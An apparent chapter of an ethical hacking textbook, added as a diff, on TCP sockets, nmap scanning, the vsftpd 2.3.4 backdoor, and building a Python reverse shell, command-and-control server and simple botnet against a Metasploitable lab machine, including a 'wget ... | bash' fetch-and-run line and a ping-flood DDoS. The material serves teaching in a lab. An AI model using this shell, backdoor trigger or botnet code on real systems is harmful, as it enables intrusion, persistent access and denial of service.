@@ -1,0 +1,218 @@
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xmlns:ns="http://www.w3.org/2001/10/synthesis" lang="en-us" xml:lang="en-us">
+	<head>
+		<title>Ethical Hacking: A Hands-on Introduction to Breaking In</title>
+		<link href="../styles/9781718501881.css" rel="stylesheet" type="text/css"/>
+<meta content="urn:uuid:3776231c-affd-4772-8376-b44c973236be" name="Adept.expected.resource"/>
+	</head>
+	<body>
+		<h2 class="h2" id="ch4"><span epub:type="pagebreak" id="page_47"/><strong><span class="big">4</span><br/>CRAFTING TCP SHELLS AND BOTNETS</strong></h2>
+		<p class="verse"><em>The cause is hidden. The effect is visible to all.</em></p>
+		<p class="chap-au">–Ovid</p>
+		<div class="imagec">
+			<img alt="image" src="../images/common.jpg"/>
+		</div>
+		<p class="noindents">So, you’ve intercepted a victim’s traffic. Let’s say you discovered that the victim works at a particular company. You decide to break into the company’s server and upload a program called a <em>reverse shell</em> that allows you to remotely execute commands on that server. The reverse shell lets you maintain access to the server even after the company fixes the vulnerability that let you gain access in the first place. This chapter explains how attackers do this and shows you how to execute this attack yourself. I’ll begin by explaining the fundamentals of socket programming. Then, you’ll apply these fundamentals to write your own reverse shell. Lastly, I’ll <span epub:type="pagebreak" id="page_48"/>conclude by analyzing a real-world botnet that infected more than 300,000 machines and show you how to write your own botnet.</p>
+		<h3 class="h3" id="ch04lev1"><strong>Sockets and Process Communication</strong></h3>
+		<p class="noindent">Before you can design your own reverse shell, you must first understand the basics of socket programming. A <em>socket</em> is an API that allows programs to communicate over the network. There are two types of sockets: TCP and UDP. TCP sockets use the TCP protocol, as mentioned in <a href="ch02.xhtml#ch2">Chapter 2</a>. They ensure that all data sent over the network is reliably delivered. In contrast, UDP sockets trade reliability for speed. You’ll often find UDP sockets used in audio or video call applications where real-time delivery of packets is important. In this chapter, you’ll use TCP sockets.</p>
+		<h4 class="h4" id="ch04lev2"><strong><em>TCP Handshakes</em></strong></h4>
+		<p class="noindent">Internet routers are designed to process millions of packets per second. However, during peak hours, routers can become overwhelmed and delete packets, which is just one of the many ways that packets are lost. So how is it possible to reliably deliver packets over a network that deletes them? TCP achieves this by keeping track of all the packets it transmits. Each packet is assigned a <em>sequence number</em> representing its place in the sequence of transmitted packets. If a sequence number is missing, TCP will know the packet was lost and retransmit it. <a href="ch04.xhtml#ch4fig1">Figure 4-1</a> shows how an image, represented in bits, is converted into TCP packets with sequence numbers.</p>
+		<div class="image" id="ch4fig1">
+			<img alt="image" src="../images/ch04fig01.jpg"/>
+		</div>
+		<p class="figcap"><em>Figure 4-1: How a file is converted into packets with sequence numbers</em></p>
+		<p class="indent">Images, text files, programs, and all other data stored in your computer are represented as binary data. Before a file can be transmitted, it must be encapsulated into a packet. However, TCP packets have a maximum size of 64KB, so files larger than this are divided and placed into several TCP packets. Each packet is assigned a <em>sequence number</em> so that the file can be reassembled. Sequence numbers are consecutive, which allows the recipient to determine the proper order in which to interpret the packets; however, each <span epub:type="pagebreak" id="page_49"/>machine starts the sequence with a random number to keep hackers from predicting the sequence.</p>
+		<p class="indent">Before two machines can transmit their packets, they must both receive and acknowledge the other machine’s starting sequence number so that they can keep track of any lost packets. This exchange is a called the <em>TCP three-way handshake</em>. <a href="ch04.xhtml#ch4fig2">Figure 4-2</a> shows how messages are exchanged in the handshake. If a machine responds to the handshake, it means that the server is willing to communicate on that port.</p>
+		<div class="image" id="ch4fig2">
+			<img alt="image" src="../images/ch04fig02.jpg"/>
+		</div>
+		<p class="figcap"><em>Figure 4-2: How the TCP three-way handshake is used to establish the communication channel</em></p>
+		<p class="indent">A client initiates a TCP connection by sending the server a <em>SYN packet</em>, which is a TCP packet with the SYN flag set to true. This SYN packet also contains the client’s starting sequence number. For instance, sending a SYN(3) packet is like saying “Hello, my starting sequence number is 3. What is yours?” Once the server receives the SYN packet, it records the client’s sequence number and responds by sending a SYN-ACK packet, which has both the SYN and ACK flags set to true. This SYN-ACK packet acknowledges receipt of the client’s sequence number and sends the server’s sequence number. For example, a SYN(0) ACK(4) packet is equivalent to saying, “My starting sequence number is 0, and I expect you to send packet 4 next.” However, the connection isn’t established until the server receives an ACK packet notifying it that the client has received its sequence number and is expecting the next value in the sequence.</p>
+		<p class="indent">When the systems have finished exchanging packets, they close the connection by exchanging FIN and ACK packets. <a href="ch04.xhtml#ch4fig3">Figure 4-3</a> shows this FIN-ACK exchange.</p>
+		<div class="image" id="ch4fig3">
+			<span epub:type="pagebreak" id="page_50"/>
+			<img alt="image" src="../images/ch04fig03.jpg"/>
+		</div>
+		<p class="figcap"><em>Figure 4-3: How FIN-ACK packets are used to close the channel</em></p>
+		<p class="indent">TCP allows for <em>full duplex</em> communication, which means that both the sender and receiver can transmit data at the same time. In contrast, in <em>half duplex</em> communication, only one party can transmit at a time. Walkie-talkies are half duplex; one person must give up the channel before the other person can speak. In contrast, cell phones are full duplex, as both parties can talk at the same time. Because a TCP connection is full duplex, both machines must send messages to close the connection. After one machine sends a FIN packet, it must wait until the other machine also sends a FIN packet before closing the connection.</p>
+		<h4 class="h4" id="ch04lev3"><strong><em>A TCP Reverse Shell</em></strong></h4>
+		<p class="noindent">TCP sockets are the fundamental building blocks of network applications. For example, utilities such as secure shell (SSH) use sockets to connect to remote servers. Once a hacker compromises a machine, they can install an SSH server and control the machine using an SSH client. However, many organizations have routers that run firewalls and implement network address translation (NAT), a feature that we’ll examine in <a href="ch08.xhtml#ch8">Chapter 8</a>. These features prevent machines outside the network from initiating connections to servers inside the network.</p>
+		<p class="indent">However, many firewalls allow the reverse: machines inside the network can still initiate connections to machines outside the network. This allows employees to access Google while preventing outside attackers from using SSH clients to connect to the organization’s servers. <a href="ch04.xhtml#ch4fig4">Figure 4-4</a> shows an overview of this idea.</p>
+		<div class="image" id="ch4fig4">
+			<span epub:type="pagebreak" id="page_51"/>
+			<img alt="image" src="../images/ch04fig04.jpg"/>
+		</div>
+		<p class="figcap"><em>Figure 4-4: How firewalls and NAT block incoming connection, but not outgoing ones</em></p>
+		<p class="indent">To circumvent the firewall and NAT, hackers can install a program called a reverse shell on the compromised machine that will initiate a connection from within the network to the attacker’s computer outside the network. After the reverse shell has connected to the hacker’s machine, the hacker can send commands to the reverse shell, which then will execute them on the organization’s server. Many shells will also mask their traffic by communicating on port 53 and encapsulating data in DNS packets.</p>
+		<p class="indent">A reverse shell consists of two parts: a component that connects to the attacker’s computer, and a shell component that allows an attacker to execute terminal commands on the victim’s machine. <a href="ch04.xhtml#ch4fig5">Figure 4-5</a> shows how a reverse shell on the Metasploitable server communicates with a TCP server socket on the attacker’s Kali Linux machine.</p>
+		<div class="image" id="ch4fig5">
+			<img alt="image" src="../images/ch04fig05.jpg"/>
+		</div>
+		<p class="figcap"><em>Figure 4-5: How the TCP client and server communicate over the network</em></p>
+		<p class="indent">When the client hosted on the Metasploitable machine is run, it requests a new socket from the operating system. Once the operating system has created the socket, it assigns it a port number and links the socket to the reverse shell. A similar process takes place on the Kali Linux machine, which <span epub:type="pagebreak" id="page_52"/>is running a TCP server that requests a specific port number from the operating system. The unique combination of port number and IP address identifies the TCP server to TCP clients on other machines. When you’re developing your own servers, it’s a good idea to select large port numbers for them to run on because other applications on the device might already be using lower port numbers. The port field is 16 bits long, so the largest port number is 2<sup>16</sup> – 1, or 65,535.</p>
+		<div class="note">
+			<p class="notet"><strong><span class="notes">NOTE</span></strong></p>
+			<p class="notep"><em>If you are curious about what each port is used for, the Internet Engineering Task Force maintains the Service Name and Transport Protocol Port Number Registry, which maps port numbers to their associated services:</em> <a href="https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml">https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml</a>.</p>
+		</div>
+		<p class="indent">This model, in which clients connect to and communicate with a dedicated server, is called the <em>client-server model</em>. You can find this client-server model all over the internet. For example, your web browser is a TCP client that communicates with Google’s TCP web server running on 172.217.12.238 on port 80.</p>
+		<p class="indent">An alternative to the client-server model is the <em>peer-to-peer (P2P) model</em>. In the P2P model, clients exchange information directly with one another. Self-hosted video chats and BitTorrent are both examples of the P2P model. We’ll use the client-server model to develop our reverse shell; however, it’s also possible to develop a P2P version of the same tool.</p>
+		<h3 class="h3" id="ch04lev4"><strong>Accessing the Victim Machine</strong></h3>
+		<p class="noindent">In <a href="ch02.xhtml#ch2">Chapter 2</a>, you discovered the IP address of the Metasploitable server. Now you need to find a way into the server. Once we have access to the server, we can upload our reverse shell to it.</p>
+		<p class="indent">Remember that processes communicate over the network through open ports, so if an attacker discovers one, they can send malicious packets to the process hosted on that port and possibly compromise the machine.</p>
+		<h4 class="h4" id="ch04lev5"><strong><em>Scanning for Open Ports</em></strong></h4>
+		<p class="noindent">Tools like <span class="literal">nmap</span> allow hackers to scan systems to discover open ports. Let’s begin by scanning the Metasploitable server. Luckily, <span class="literal">nmap</span> is installed by default on Kali Linux. Run the following command to start the scan:</p>
+		<p class="programs">kali@kali:~$ <span class="codestrong1">nmap -sV 192.168.1.101</span><br/>Starting Nmap ( https://nmap.org )<br/>Nmap scan report for 192.168.1.101<br/>Host is up (0.00064s latency).<br/>Not shown: 977 closed ports<br/>PORT     STATE SERVICE     VERSION<br/>
+21/tcp   open  ftp         vsftpd 2.3.4<br/>
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)<br/><span epub:type="pagebreak" id="page_53"/>23/tcp   open  telnet      Linux telnetd<br/>
+25/tcp   open  smtp        Postfix smtpd<br/>
+53/tcp   open  domain      ISC BIND 9.4.2<br/>
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)<br/>
+... More Ports...</p>
+		<p class="indent">The <span class="literal">-sV</span> flag enables version detection, which tells <span class="literal">nmap</span> to detect the version of each application running on the port. Next, specify the IP address being scanned (yours may be different than the one shown here). This command should return the open ports, the applications running on those ports, and the versions of those applications.</p>
+		<p class="indent">One of the ways that <span class="literal">nmap</span> scans the ports on a host is by trying to establish a connection with each port. However, this is slow and will often trigger alarms. Therefore, <span class="literal">nmap</span> performs a <em>SYN scan</em> by default. Instead of establishing a full connection, a SYN scan sends TCP SYN packets, listens for SYNACK responses and marks a port as open if it receives a response. However, <span class="literal">nmap</span> does not complete the handshake by sending the final ACK packet. You can explicitly run a SYN scan by using the following command (the <span class="literal">-sS</span> flag represents the SYN scan):</p>
+		<p class="programs">kali@kali:~$ <span class="codestrong1">nmap -sS <span class="codeitalic">&lt;Metasploitable IP address&gt;</span></span></p>
+		<p class="indent">Attackers also sometimes use TCP-FIN packets to bypass firewall protections. For example, a system administrator can specify rules that govern which packets are allowed to enter and leave a system. They might allow only outgoing packets on port 22, thus blocking any incoming packets on that port. This means that all SYN packets would be blocked. A hacker could instead probe the port using FIN packets given that both incoming and outgoing connections use these. Use the following command to run a FIN scan on the Metasploitable server:</p>
+		<p class="programs">kali@kali:~$ <span class="codestrong1">nmap -sF <span class="codeitalic">&lt;Metasploitable IP address&gt;</span></span></p>
+		<p class="indent">In addition to FIN scans, <span class="literal">nmap</span> lets you perform <em>XMas scans</em>, which use an odd packet configuration to bypass detection and learn about the system. An XMas scan sets the FIN, PSH, and URG flags in the TCP packet. The PSH and URG flags are rarely used, and systems often contain incomplete or incorrect implementations of the TCP/IP standard that don’t handle them uniformly. By examining how a system responds to these flags, an attacker can infer information about the TCP/IP implementation and learn about the system. You can run an XMas scan by using this command:</p>
+		<p class="programs">kali@kali:~$ <span class="codestrong1">nmap -sX <span class="codeitalic">&lt;Metasploitable IP address&gt;</span></span></p>
+		<div class="note">
+			<p class="notet"><strong><span class="notes">NOTE</span></strong></p>
+			<p class="notep"><em>It’s called an XMas scan because when you examine the bits in Wireshark, they look like bulbs on a Christmas tree, as depicted in <a href="ch04.xhtml#ch4fig6">Figure 4-6</a>.</em></p>
+		</div>
+		<div class="image" id="ch4fig6">
+			<span epub:type="pagebreak" id="page_54"/>
+			<img alt="image" src="../images/ch04fig06.jpg"/>
+		</div>
+		<p class="figcap"><em>Figure 4-6: An XMas scan</em></p>
+		<h4 class="h4" id="ch04lev6"><strong><em>Exploiting a Vulnerable Service</em></strong></h4>
+		<p class="noindent">Once the you know the version of a running application, you can search for vulnerabilities that might give you a way into the server in the National Vulnerability Database at <em><a href="https://nvd.nist.gov/">https://nvd.nist.gov/</a></em>. In <a href="ch08.xhtml#ch8">Chapter 8</a>, you’ll learn how to automate this discovery process.</p>
+		<p class="indent">If system administrators do regular scans themselves and keep systems up to date, it will be difficult for an attacker to use a known vulnerability to gain access. In these cases, an attacker will need to discover an unknown vulnerability. These are called <em>zero-day</em> vulnerabilities because the victim is unaware of them and so has zero days to fix them. These vulnerabilities can be profitable. For example, an Android and iOS zero-click vulnerability sold for more than two million dollars each in 2019 to zero-day firm Zerodium. Many zero-day vulnerabilities are found using a technique called <em>fuzzing</em>, which we’ll explore in <a href="ch09.xhtml#ch9">Chapter 9</a>.</p>
+		<p class="indent">For now, you’ll use the vsftp backdoor introduced in <a href="ch01.xhtml#ch1">Chapter 1</a> to get into the Metasploitable server. Notice from the <span class="literal">nmap</span> scan that the system is running vsftp 2.3.4, a version that has a backdoor that lets attackers access the system. Let’s open the backdoor. Start a new terminal in Kali Linux and run the following commands:</p>
+		<p class="programs">kali@kali:~$ <span class="codestrong1">nc <span class="codeitalic">&lt;Metasploitable IP address&gt;</span> 21</span><br/><span class="codestrong1">user Hacker:)</span><br/><span class="codestrong1">pass invalid</span></p>
+		<p class="indent">When the backdoor is opened, it will create a shell running on port 6200. This port number is preprogrammed into the backdoor. If you’ve successfully unlocked the backdoor, the terminal will appear to hang. Leave this terminal open and start a new one. In the new terminal, walk through the backdoor by connecting to the shell running on port 6200 by using the following command:</p>
+		<p class="programs">kali@kali:~$ <span class="codestrong1">nc <span class="codeitalic">&lt;Metasploitable IP address&gt;</span> 6200</span></p>
+		<p class="indent">Now that you’re in, the commands you execute in this terminal will be executed on the server you just hacked. You’ll use this terminal later to download your reverse shell, so leave it open. This shell will give you access to the machine even after the system administrators have discovered the backdoor vulnerability and patched vsftp.</p>
+		<h3 class="h3" id="ch04lev7"><span epub:type="pagebreak" id="page_55"/><strong>Writing a Reverse Shell Client</strong></h3>
+		<p class="noindent">Now that you have a conceptual understanding of reverse shells, let’s walk through the process of implementing one. Open Kali Linux and create a folder called “shell” on your desktop. For now, we’ll place both our client and server programs in this folder.</p>
+		<p class="indent">We’ll write the program in Mousepad, which is the default text editor in Kali Linux, but you can use any editor of your choice. Run the following command to open the Mousepad editor:</p>
+		<p class="programs">kali@kali:~$ <span class="codestrong1">mousepad &amp;</span></p>
+		<p class="indent">The following program receives commands from the hacker’s TCP server and executes them on the victim’s machine before sending the results back to the hacker. Copy the following reverse shell code into the editor and save the file as <em>reverseShell.py</em> in the shell folder you just created.</p>
+		<p class="programs">   import sys<br/>
+   from subprocess import Popen, PIPE<br/>
+   from socket import *<br/><span class="ent">➊</span> serverName = sys.argv[1]<br/>
+   serverPort = 8000<br/>
+   #Create IPv4(AF_INET), TCPSocket(Sock_Stream)<br/><span class="ent">➋</span> clientSocket = socket(AF_INET, SOCK_STREAM)<br/><span class="ent">➌</span> clientSocket.connect((serverName, serverPort))<br/>
+   clientSocket.send('Bot reporting for duty'.encode()) <span class="ent">➍</span> <br/>
+   command = clientSocket.recv(4064).decode() <span class="ent">➎</span> <br/>
+   while command != "exit":<br/>
+     <span class="ent">➏</span> proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)<br/>
+     <span class="ent">➐</span> result, err = proc.communicate()<br/>
+        clientSocket.send(result)<br/>
+        command = (clientSocket.recv(4064)).decode()<br/><br/>
+   clientSocket.close()</p>
+		<p class="indent">We read the the attacker’s IP address from the first command line parameter you’ll supply when you run the program <span class="ent">➊</span>. Then, we create a new client socket <span class="ent">➋</span>. The <span class="literal">AF_INET</span> parameter tells the socket library to create an <span class="literal">IPV4</span> socket, and the <span class="literal">SOCK_STREAM</span> parameter tells the socket library to make it a TCP socket. If you wanted to create an <span class="literal">IPV6</span> UDP socket, you would supply the <span class="literal">AF_INET6</span> and <span class="literal">SOCK_DGRAM</span> parameters instead.</p>
+		<p class="indent">After you’ve created the socket, you can use it to connect to the socket on the hacker’s machine by supplying a <em>tuple</em> containing the socket’s IP address and port number <span class="ent">➌</span>. Tuples are lists that can’t be modified, and we declare them using parentheses () instead of brackets []. In this case, the tuple contains variables we defined earlier in the program, so it should look something like this: (<span class="literal">172.217.12.238, 8000</span>).</p>
+		<p class="indent">The client should then notify the attacker’s machine that it is ready to accept commands. The Python <span class="literal">socket</span> library is designed to send binary <span epub:type="pagebreak" id="page_56"/>data, so if you want to send the string <span class="literal">'Bot reporting for duty'</span>, you must first encode it into binary by calling <span class="literal">.encode()</span> <span class="ent">➍</span>. Similarly, all information received from the socket will be in binary, so the program must decode it if you want to view it as a string <span class="ent">➎</span>. The value <span class="literal">4064</span> specifies the maximum number of bytes to read.</p>
+		<p class="indent">The client will continue accepting and executing commands until the hacker sends the <span class="literal">exit</span> command. The <span class="literal">Popen</span> method <span class="ent">➏</span> creates a copy, or <em>fork</em>, of the current process, called a <em>subprocess</em>. It then passes the command to the subprocess, which executes it on the client. Once the subprocess has executed the command, the <span class="literal">proc.communicate()</span> function <span class="ent">➐</span> reads the results, which are then sent to the hacker’s machine.</p>
+		<h3 class="h3" id="ch04lev8"><strong>Writing a TCP Server That Listens for Client Connections</strong></h3>
+		<p class="noindent">Now, you’ll write the server that runs on the hacker’s Kali Linux machine. This server will be responsible for two key functions: 1) accepting connections from clients, and 2) sending and receiving commands. You’ll often hear this server called a <em>command and control (CNC)</em> server. Open a new window in your text editor, enter the following code, and then save the file as <em>shellServer.py</em> in the same shell folder:</p>
+		<p class="programs">   from socket import *<br/>
+   serverPort = 8000<br/><span class="ent">➊</span> serverSocket = socket(AF_INET, SOCK_STREAM)<br/><span class="ent">➋</span> serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)<br/><span class="ent">➌</span> serverSocket.bind(('', serverPort))<br/><span class="ent">➍</span> serverSocket.listen(1)<br/>
+   print("Attacker box listening and awaiting instructions")<br/><span class="ent">➎</span> connectionSocket, addr = serverSocket.accept()<br/>
+   print("Thanks for connecting to me "<br/>
+             +str(addr))<br/>
+   message = connectionSocket.recv(1024)<br/>
+   print(message)<br/>
+   command =""<br/>
+   while command != "exit":<br/>
+       command = input("Please enter a command: ")<br/>
+       connectionSocket.send(command.encode())<br/>
+       message = connectionSocket.recv(1024).decode()<br/>
+       print(message)<br/><br/><span class="ent">➏</span> connectionSocket.shutdown(SHUT_RDWR)<br/>
+   connectionSocket.close()</p>
+		<p class="indent">First, we create an IPv4 TCP socket <span class="ent">➊</span>. To ensure that sockets can communicate effectively, the IP versions and protocols must both match, so we <span epub:type="pagebreak" id="page_57"/>use the same protocols as we did with the client. We make the socket more robust by allowing the operating system to reuse a socket that was recently used <span class="ent">➋</span>. After we create the socket, we can bind it to a port on the machine. The <span class="literal">bind()</span> function takes two parameters <span class="ent">➌</span> : the machine’s IP address, and the port. If the IP address parameter is empty, the function will use the default IP address assigned to the machine.</p>
+		<p class="indent">Now that the socket is bound to a port, it can begin listening for connections <span class="ent">➍</span>. Here, you can specify the number of connections you want to support. Because you have only one client, it’s okay to support a single connection. Once the client connects to our socket, we’ll accept the connection and return a connection object <span class="ent">➎</span>. We’ll use this object to send and receive commands. Once we finish sending commands, we’ll configure the connection for a quick getaway <span class="ent">➏</span> and close it.</p>
+		<p class="indent">Start the server by running the following command:</p>
+		<p class="programs">kali@kali:~$ <span class="codestrong1">python3 ~/Desktop/shell/shellServer.py</span></p>
+		<p class="indent">The server is now waiting for the client to connect to it, and you can begin the process of loading the client (<em>reverseShell.py</em>) onto the Metasploitable server.</p>
+		<h3 class="h3" id="ch04lev9"><strong>Loading the Reverse Shell onto the Metasploitable Server</strong></h3>
+		<p class="noindent">Now that you’ve developed both the reverse shell and a hacker server in Python, load the Python reverse shell onto the Metasploitable server. We’ll use the reverse shell you’ve written to maintain access even after the vulnerability in vsftp has been patched. Because an attacker doesn’t have the server’s username or password, and thus can’t log into the server, you must use the shell provided by the vsftp backdoor to upload your reverse shell onto the Metasploitable server from the Kali Linux machine.</p>
+		<p class="indent">Navigate to the directory on the Kali Linux machine that contains the <em>reverseShell.py</em> and <em>shellServer.py</em> files:</p>
+		<p class="programs">kali@kali:~$ <span class="codestrong1">cd ~/Desktop/shell</span></p>
+		<p class="indent">Next, start a local server that will serve the <em>reverseShell.py</em> file to the Metasploitable server:</p>
+		<p class="programs">kali@kali:~/Desktop/shell$ <span class="codestrong1">python3 -m http.server 8080</span></p>
+		<p class="indent">The <span class="literal">-m</span> represents the module that is run. Here, you’re running the <span class="literal">http.server</span> module, which allows you to start a web server.</p>
+		<p class="indent">Open a terminal window and connect to the vsftp backdoor shell on port 6200, as shown in the code that follows. Use this shell to create a new directory on the Metasploitable server and download the <em>reverseShell.py</em> file into it from the hacker’s server. To do so, use the following commands:</p>
+		<p class="programs">kali@kali:~$ <span class="codestrong1">nc 192.168.1.101 6200</span><br/><span class="codestrong1">mkdir shell</span><br/><span epub:type="pagebreak" id="page_58"/><span class="codestrong1">cd shell</span><br/><span class="codestrong1">wget <span class="codeitalic">&lt;Kali IP&gt;</span>:8080/reverseShell.py</span><br/>
+--13:38:01--  http://192.168.1.103:8080/reverseShell.py<br/>
+            =&gt; `reverseShell.py'<br/>Connecting to 192.168.1.103:8080... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 864 [text/plain]<br/><br/>
+     0K                                                       100%  161.63 MB/s<br/><br/>
+13:38:01 (161.63 MB/s) - `reverseShell.py' saved [864/864]</p>
+		<p class="indent">Start the reverse shell on the Metasploitable machine by entering the following command, in the current Netcat session:</p>
+		<p class="programs"><span class="codestrong1">python reverseShell.py <span class="codeitalic">&lt;Kali IP address&gt;</span> &amp;</span></p>
+		<p class="indent">Your reverse shell will now attempt to connect to your server. Switch over to the Kali Linux machine and try executing the <span class="literal">whoami</span> command:</p>
+		<p class="programs">kali@kali:python3 ~/Desktop/shell/shellServer.py<br/>Attacker box listening and awaiting instructions<br/>Thanks for connecting to me ('192.168.1.101', 50602)<br/>Bot reporting for duty<br/>Please enter a command: <span class="codestrong1">whoami</span><br/>root<br/><br/>Please enter a command: <span class="codestrong1">pwd</span><br/>
+/shell<br/><br/>Please enter a command: <span class="codestrong1">ls</span><br/>reverseShell.py<br/><br/>Please enter a command:</p>
+		<p class="indent">Here, <span class="literal">whoami</span> prints the current user. If the output says <span class="literal">root</span>, you’ve gained root access to the Metasploitable server. The preceding output also shows some examples of commands you can execute on the Metasploitable machine. The <span class="literal">pwd</span> command prints the working directory, and the <span class="literal">ls</span> command lists the files in the directory. In this case, you should see the <em>reverseShell.py</em> file that you’ve downloaded.</p>
+		<h3 class="h3" id="ch04lev10"><strong>Botnets</strong></h3>
+		<p class="noindent">So far you’ve built a server bot that controls only one client. However, you could extend your server so that it can control several clients at once. In <span epub:type="pagebreak" id="page_59"/><em>botnets</em> like these, several client machines connect to a single CNC server. These botnets can do many things, including performing a <em>distributed denial of service (DDoS)</em> attack by overwhelming a web server with traffic, causing it to become temporarily unavailable.</p>
+		<p class="indent">On October 21, 2016, the Dyn DNS service fell victim to a DDOS attack that used a botnet called Mirai. The botnet prevented users from accessing sites like Airbnb, Amazon, and Netflix. Before your browser accesses a website, it first obtains the website’s IP address by communicating with a DNS server. If a botnet overwhelms a DNS server, it will prevent users from accessing the domains hosted on that server.</p>
+		<p class="indent">The Mirai botnet was composed of a collection of Internet of Things (IoT) devices like cameras and home routers. Instead of using a backdoor, Mirai walked right through the devices’ front door by logging in using default usernames and passwords. To do this, Mirai used a SYN scan to search for devices with port 23 open. When it found a device, a Mirai bot would try to connect using a collection of default credentials. If the bot succeeded in logging in, it used the commands <span class="literal">wget</span> or <span class="literal">tftp</span> to load bot client code onto the machine. If neither command was available, it would load its own version of <span class="literal">wget</span> using a custom loader. Once compromised, the device would send its IP address, username, and password back to the CNC server. The Mirai botnet compromised more than 350,000 devices.</p>
+		<p class="indent">Because the Mirai bot used a dedicated CNC server, security researchers could examine the traffic and determine the server’s IP address. The researchers contacted the server’s ISP and asked it to disable that IP address. However, the bot code didn’t specify a fixed IP address for the server. Instead, the bots determined the IP address by resolving a URL. This meant that if the IP address of one CNC server was disabled, the botnet could be assigned to a new CNC server by updating the mapping between the URL and the IP address in DNS, making it difficult to take the botnet offline. The Mirai botnet code is available on GitHub at <em><a href="https://github.com/jgamblin/Mirai-Source-Code/">https://github.com/jgamblin/Mirai-Source-Code/</a></em>.</p>
+		<p class="indent"><a href="ch04.xhtml#ch4fig7">Figure 4-7</a> shows two types of botnet architecture. The first is a clientserver architecture, in which a single server controls multiple clients. One of the many disadvantages of this architecture is that the botnet can be taken down if the server is disabled. The second is a P2P architecture, in which any bot in the network can be designated the server. This removes any single point of failure. The Mirai botnet used the client-server model, but mitigated the architecture’s single point of failure by having the bots resolve the domain to determine the CNC server’s IP address.</p>
+		<div class="image" id="ch4fig7">
+			<span epub:type="pagebreak" id="page_60"/>
+			<img alt="image" src="../images/ch04fig07.jpg"/>
+		</div>
+		<p class="figcap"><em>Figure 4-7: Two botnet architectures: client-server and P2P</em></p>
+		<p class="indent">Mirai was sophisticated, but writing a botnet doesn’t have to be complicated. Let’s start by creating the file that contains the commands that you want your bots to run:</p>
+		<p class="programs">kali@kali:~$ <span class="codestrong1">touch commands.sh</span><br/>kali@kali:~$ <span class="codestrong1">echo "ping 172.217.9.206" &gt; commands.sh</span></p>
+		<p class="indent">The <span class="literal">touch</span> command creates a new file called <em>commands.sh</em>, and the <span class="literal">echo</span> command writes <span class="literal">"ping 172.217.9.206"</span> to that file. The <span class="literal">ping</span> command checks to see whether a machine is online by sending it a packet and waiting for a response. Put together, this script will send ping packets to the IP address 172.217.9.206. Several machines repeatedly doing this will result in a DDoS attack.</p>
+		<p class="indent">Once you’ve created the shell script, create a one-line botnet server using the following command:</p>
+		<p class="programs">kali@kali:~$ <span class="codestrong1">python3 -m http.server 8080</span></p>
+		<p class="indent">Now you can write a simple bot client that downloads the script and executes it. Remember that the bot will execute all of the commands in the <em>commands.sh</em> file, so be careful about what you include in it. For instance, if the <span class="literal">ping</span> command were replaced with the command <span class="literal">rm -rf /</span>, the bot would delete all of the data on the machine. Next, run the following command:</p>
+		<p class="programs">msfadmin@metasploitable:~$ <span class="codestrong1">wget -0- <span class="codeitalic">&lt;IP address of server bot&gt;</span> :8080\commands.sh | bash</span><br/></p>
+		<p class="indent">The <span class="literal">-0-</span> flag outputs the contents of the downloaded file. The contents are then sent, or <em>piped</em>, using the <span class="literal">|</span> operator to the Bash shell where they’re executed. The <em>command.sh</em> script instructs the client to ping Google’s IP address (172.217.9.206).</p>
+		<p class="indent"><span epub:type="pagebreak" id="page_61"/>If a server instructs enough clients to do this at once, it can achieve a DDoS attack. Hackers often profit from renting their botnet armies to other hackers, who use them for this purpose.</p>
+		<h3 class="h3" id="ch04lev11"><strong>Exercises</strong></h3>
+		<p class="noindent">Expand your understanding of botnets, reverse shells, and scanning with these exercises. In the first exercise, you’ll implement a bot server that can handle multiple bots simultaneously. In the second exercise, you’ll use the Scapy library to implement a SYN scan. In the final exercise, you’ll implement a Python program that will allow you to detect XMas scans.</p>
+		<h4 class="h4" id="ch04lev12"><strong><em>A Multiclient Bot Server</em></strong></h4>
+		<p class="noindent">In this chapter, you wrote a server that could control only a single bot. Now let’s extend your implementation so that it can control multiple bots at once. Instead of sending individual commands, the bots will all receive the same command. After the CNC server has received a response, it should print out the bot’s IP address and the result of executing the command. I recommend that you use the <span class="literal">socketserver</span> library to manage multiple TCP connections.</p>
+		<p class="programs">   import socketserver<br/><br/><span class="ent">➊</span> class BotHandler(socketserver.BaseRequestHandler):<br/><br/>
+     <span class="ent">➋</span> def handle(self):<br/>
+         <span class="ent">➌</span> self.data = self.request.recv(1024).strip()<br/>
+            print("Bot with IP {}  sent:".format(self.client_address[0]))<br/>
+            print(self.data)<br/>
+         <span class="ent">➍</span> self.request.sendall(self.data.upper())<br/><br/>
+   if __name__ == "__main__":<br/>
+        HOST, PORT = "", 8000<br/>
+     <span class="ent">➎</span> tcpServer =  socketserver.TCPServer((HOST, PORT), BotHandler)<br/>
+        try:<br/>
+         <span class="ent">➏</span> tcpServer.serve_forever()<br/>
+        except:<br/>
+            print("There was an error")</p>
+		<p class="indent">We create a new TCP server <span class="ent">➎</span> and whenever a client connects to the server, it creates a new internal thread and instantiates a new <span class="literal">BotHandler</span> class. Each connection is associated with its own instance of the <span class="literal">BotHandler</span> class <span class="ent">➊</span>. The <span class="literal">handle()</span> method <span class="ent">➋</span> is called whenever <span class="literal">BotHandler</span> receives data from a client. Instance variables <span class="ent">➌</span> contain information about the request. For example, <span class="literal">self.request.recv(1024)</span> contains the data from the request, whereas <span class="literal">self.client_address</span> contains a tuple with the client’s IP address and port number. The <span class="literal">self.request.sendall()</span> method <span class="ent">➍</span> sends to the client all the <span epub:type="pagebreak" id="page_62"/>information it is passed. This example converts all the received data to uppercase. The server will continue to run until it is terminated (CTRL-C) <span class="ent">➏</span>.</p>
+		<p class="indent">Currently, the server merely converts messages for the clients to uppercase letters and sends them back. Extend your server so that it reads from a file and sends the commands in that file to the clients.</p>
+		<h4 class="h4" id="ch04lev13"><strong><em>SYN Scans</em></strong></h4>
